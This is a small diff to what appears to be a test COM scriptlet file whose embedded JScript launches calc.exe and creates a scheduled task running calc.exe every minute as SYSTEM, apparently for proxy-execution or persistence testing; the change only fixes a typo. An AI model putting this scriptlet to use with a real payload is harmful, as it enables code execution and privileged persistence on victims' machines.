@@ -6,7 +6,7 @@
 	<script language="JScript">
 		<![CDATA[
 			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr “calc.exe” /sc M INUTE /ru system");
+			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr “calc.exe” /sc MINUTE /ru system");
 		]]>
 </script>
 </registration>
